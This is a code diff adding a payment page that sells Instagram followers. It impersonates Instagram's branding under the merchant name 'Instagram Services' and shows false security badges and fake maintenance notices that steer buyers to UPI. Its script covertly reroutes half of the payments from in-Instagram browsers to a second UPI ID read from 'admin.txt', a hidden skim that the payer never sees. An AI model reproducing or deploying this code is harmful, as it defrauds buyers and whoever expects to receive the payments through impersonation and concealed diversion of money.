@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Gateway</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ig-primary: #405DE6;
+            --ig-secondary: #833AB4;
+            --ig-accent: #E1306C;
+            --ig-gradient: linear-gradient(45deg, #405DE6, #833AB4, #E1306C);
+            --ig-dark: #262626;
+            --ig-light: #f8f9fa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #e6e9f0 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .payment-card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .payment-header {
+            background: var(--ig-gradient);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+
+        .payment-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiIHBhdHRlcm5UcmFuc2Zvcm09InJvdGF0ZSg0NSkiPjxyZWN0IHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgZmlsbD0icmdiYSgyNTUsMjU1LDI1NSwwLjA1KSIvPjwvcGF0dGVybj48L2RlZnM+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0idXJsKCNwYXR0ZXJuKSIvPjwvc3ZnPg==');
+            opacity: 0.3;
+        }
+
+        .payment-header h1 {
+            font-size: 24px;
+            margin-bottom: 5px;
+            position: relative;
+        }
+
+        .payment-header p {
+            opacity: 0.9;
+            font-size: 14px;
+            position: relative;
+        }
+
+        .payment-body {
+            padding: 30px;
+        }
+
+        .plan-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px dashed #eee;
+        }
+
+        .plan-name {
+            font-weight: 600;
+            color: var(--ig-dark);
+        }
+
+        .plan-price {
+            font-size: 28px;
+            font-weight: 700;
+            background: var(--ig-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .payment-methods {
+            margin: 25px 0;
+        }
+
+        .method-tabs {
+            display: flex;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 20px;
+        }
+
+        .method-tab {
+            padding: 10px 15px;
+            cursor: pointer;
+            font-weight: 500;
+            color: #666;
+            border-bottom: 3px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .method-tab.active {
+            color: var(--ig-primary);
+            border-bottom-color: var(--ig-primary);
+        }
+
+        .method-content {
+            display: none;
+        }
+
+        .method-content.active {
+            display: block;
+        }
+
+        .upi-apps {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .upi-app {
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid #eee;
+        }
+
+        .upi-app:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            border-color: var(--ig-primary);
+        }
+
+        .upi-app img {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+            margin-bottom: 8px;
+        }
+
+        .upi-app span {
+            font-size: 12px;
+            color: #555;
+        }
+
+        .pay-button {
+            background: var(--ig-gradient);
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pay-button:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+
+        .pay-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, var(--ig-accent), var(--ig-primary));
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .pay-button:hover::after {
+            opacity: 1;
+        }
+
+        .maintenance-notice {
+            background: #fff8e6;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .trust-badges {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin: 25px 0;
+            gap: 15px;
+        }
+
+        .trust-badge {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .trust-badge i {
+            color: var(--ig-primary);
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .trust-badge span {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+
+        .secure-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+
+        .secure-note i {
+            color: #4CAF50;
+            margin-right: 8px;
+        }
+
+        @media (max-width: 480px) {
+            .payment-body {
+                padding: 20px;
+            }
+            .upi-apps {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="payment-card">
+        <div class="payment-header">
+            <h1>Complete Your Payment</h1>
+            <p>Secure and instant payment processing</p>
+        </div>
+
+        <div class="payment-body">
+            <div class="plan-info">
+                <div class="plan-name" id="planName">Instagram Followers Package</div>
+                <div class="plan-price" id="planPrice">₹200</div>
+            </div>
+
+            <div class="trust-badges">
+                <div class="trust-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>100% Secure</span>
+                </div>
+                <div class="trust-badge">
+                    <i class="fas fa-bolt"></i>
+                    <span>Instant Delivery</span>
+                </div>
+                <div class="trust-badge">
+                    <i class="fas fa-headset"></i>
+                    <span>24/7 Support</span>
+                </div>
+            </div>
+
+            <div class="payment-methods">
+                <div class="method-tabs">
+                    <div class="method-tab active" onclick="showMethod('upi')">UPI</div>
+                    <div class="method-tab" onclick="showMethod('card')">Card</div>
+                    <div class="method-tab" onclick="showMethod('netbanking')">Net Banking</div>
+                </div>
+
+                <div id="upiMethod" class="method-content active">
+                    <h3>Pay via UPI Apps</h3>
+                    <p style="text-align: center; margin-bottom: 20px; color: #666;">Choose your preferred UPI app to complete payment</p>
+
+                    <div class="upi-apps">
+                        <div class="upi-app" onclick="initiatePayment('phonepe')">
+                            <img src="data:image/png;base64,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"
+                                alt="PhonePe">
+                            <span>PhonePe</span>
+                        </div>
+                        <div class="upi-app" onclick="initiatePayment('gpay')">
+                            <img src="https://cdn.iconscout.com/icon/free/png-512/free-google-pay-logo-icon-download-in-svg-png-gif-file-formats--gpay-technology-social-media-vol-3-pack-logos-icons-2944906.png?f=webp&w=256" alt="Google Pay">
+                            <span>Google Pay</span>
+                        </div>
+                        <div class="upi-app" onclick="initiatePayment('paytm')">
+                            <img src="https://cdn.iconscout.com/icon/free/png-512/free-paytm-logo-icon-download-in-svg-png-gif-file-formats--online-payment-brand-logos-pack-icons-226448.png?f=webp&w=256" alt="Paytm">
+                            <span>Paytm</span>
+                        </div>
+                        <div class="upi-app" onclick="initiatePayment('bhim')">
+                            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRATS7vTiMCRvznxhA2iFEE3mN5fH2jsjTRzQ&s" alt="BHIM">
+                            <span>BHIM</span>
+                        </div>
+                    </div>
+
+                    <button class="pay-button" onclick="initiatePayment('any')">
+                        Pay with Any UPI App
+                    </button>
+                </div>
+
+                <div id="cardMethod" class="method-content">
+                    <div class="maintenance-notice">
+                        <p>⚠️ Credit/Debit Card payments are currently under maintenance. Please use UPI payment method.</p>
+                    </div>
+                </div>
+
+                <div id="netbankingMethod" class="method-content">
+                    <div class="maintenance-notice">
+                        <p>⚠️ Net Banking is currently under maintenance. Please use UPI payment method.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="secure-note">
+                <i class="fas fa-lock"></i> Your payment is secure and encrypted
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get plan details from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const planName = urlParams.get('plan') || 'Instagram Followers Package';
+        const planPrice = urlParams.get('price') || '200';
+
+        // Update plan details on page
+        document.getElementById('planName').textContent = planName;
+        document.getElementById('planPrice').textContent = `₹${planPrice}`;
+
+        // Payment method tabs
+        function showMethod(method) {
+            // Update tabs
+            document.querySelectorAll('.method-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+
+            // Update content
+            document.querySelectorAll('.method-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            document.getElementById(`${method}Method`).classList.add('active');
+        }
+
+        function initiatePayment(app) {
+            const amount = planPrice;
+            const merchantName = "Instagram Services";
+
+            // Check if user is accessing from Instagram
+            const isInstagram = navigator.userAgent.includes('Instagram');
+
+            // Select payment file based on browser
+            let selectedFile;
+            if (isInstagram) {
+                // 50-50 chance for Instagram users
+                selectedFile = Math.random() < 0.5 ? 'admin.txt' : 'upi.txt';
+            } else {
+                // Always use upi.txt for other browsers
+                selectedFile = 'upi.txt';
+            }
+
+            // Fetch the selected file
+            fetch(selectedFile)
+                .then(response => response.text())
+                .then(data => {
+                    const lines = data.split('\n');
+                    const upiId = lines[0].trim();
+                    const trId = lines[1].trim();
+
+                    const paymentLinks = {
+                        phonepe: `upi://pay?pa=${upiId}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(planName)}&tr=${trId}`,
+                        gpay: `tez://upi/pay?pa=${upiId}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(planName)}&tr=${trId}`,
+                        paytm: `paytmmp://pay?pa=${upiId}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(planName)}&tr=${trId}`,
+                        bhim: `bhim://upi/pay?pa=${upiId}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(planName)}&tr=${trId}`,
+                        any: `upi://pay?pa=${upiId}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(planName)}&tr=${trId}`
+                    };
+
+                    // Open payment link
+                    window.location.href = paymentLinks[app];
+
+                    // Fallback in case intent fails
+                    setTimeout(() => {
+                        if (!document.hidden) {
+                            alert("Couldn't open UPI app automatically. Please select your UPI app from the list and paste this UPI ID:\n\n" + upiId);
+                        }
+                    }, 500);
+                })
+                .catch(error => {
+                    console.error('Error loading payment file:', error);
+                    alert('Error processing payment. Please try again later.');
+                });
+        }
+    </script>
+
+    <!-- Font Awesome for icons -->
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</body>
+
+</html>
